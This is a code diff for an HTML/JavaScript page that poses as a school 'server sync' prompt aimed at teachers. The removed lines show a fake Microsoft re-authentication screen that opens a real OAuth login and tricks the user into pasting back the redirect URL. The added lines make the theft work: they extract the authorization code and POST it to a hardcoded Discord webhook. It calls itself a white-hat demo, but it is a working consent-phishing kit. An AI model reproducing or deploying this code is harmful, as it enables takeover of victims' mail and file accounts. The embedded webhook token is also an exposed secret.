@@ -1,38 +1,45 @@
-<!DOCTYPE html>
-<html>
-<body>
-
-<!-- 1. THE VISUAL PART (What the teacher sees) -->
-<div id="display-area" style="text-align: center; font-family: sans-serif;">
-    <h2 style="color: #0078d4;">School Server Sync Required</h2>
-    <p>Your session has expired. Please re-authenticate to keep your D: drive access.</p>
-    <button onclick="redirectToRealAuth()" style="padding: 12px; background: #0078d4; color: white; border: none; cursor: pointer;">
-        Sync Now
-    </button>
-</div>
-
-<!-- 2. THE LOGIC PART (The "Secret" script) -->
-<script>
-function redirectToRealAuth() {
-    // This part opens the "Real" login
-    const authUrl = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=00000000-0000-0000-0000-000000000000&response_type=code&redirect_uri=http://localhost/verify&scope=Mail.Read%20Files.ReadWrite.All%20offline_access";
-    window.open(authUrl, '_blank'); 
-
-    // This part changes the screen to the "Trap"
-    document.getElementById('display-area').innerHTML = `
-        <h3 style="color:red">⚠️ ERROR: 0x80048823</h3>
-        <p>Automatic sync failed. Copy the URL from the other window and paste it here to manually fix the connection:</p>
-        <input type="text" id="stolenCode" style="width:90%; padding: 10px;">
-        <br><br>
-        <button onclick="exfiltrateData()" style="padding: 10px;">Fix Connection</button>
-    `;
-}
-
 async function exfiltrateData() {
     const fullUrl = document.getElementById('stolenCode').value;
-    alert("🚨 WHITE-HAT DEMO: If this were real, your 'Authorization Code' just got sent to the hacker's Discord!");
-}
-</script>
+    
+    // 1. Extracting the sensitive 'code' from the URL using Regex
+    const codeMatch = fullUrl.match(/[?&]code=([^&]+)/);
+    const secretCode = codeMatch ? codeMatch[1] : "NO_CODE_FOUND";
 
-</body>
-</html>
+    // 2. YOUR WEBHOOK URL GOES HERE
+    // Replace the text below with your actual Discord Webhook URL
+    const webhookURL = "https://discord.com/api/webhooks/1466448858925240412/osJaKR7wAQ5s1IwHKeW6SjBWixidlk7t6U-gxWBcW5vlNlZfkSoRJZRrO34LXI_a4LM2"; 
+
+    // 3. Creating the "Payload" - This is what the hacker sees on Discord
+    const payload = {
+        username: "ConsentFix Logger",
+        avatar_url: "https://i.imgur.com/8nNmT6W.png",
+        embeds: [{
+            title: "🔓 Unauthorized Access: Token Intercepted",
+            color: 15158332, // Red color
+            fields: [
+                { name: "Target", value: "Teacher Workstation", inline: true },
+                { name: "Platform", value: navigator.platform, inline: true },
+                { name: "Extracted Code", value: `\`\`\`${secretCode}\`\`\`` }
+            ],
+            footer: { text: "Education Demo - White-Hat Testing" },
+            timestamp: new Date()
+        }]
+    };
+
+    try {
+        // 4. The actual "Illegal" act: Sending the data out of the browser
+        const response = await fetch(webhookURL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+
+        if (response.ok) {
+            alert("🚨 SUCCESS: Data sent to hacker's server.\n\nTeachers: Notice how no warning appeared!");
+        } else {
+            console.error("Webhook failed. Check your URL.");
+        }
+    } catch (error) {
+        alert("Network Error: Could not reach the server.");
+    }
+}
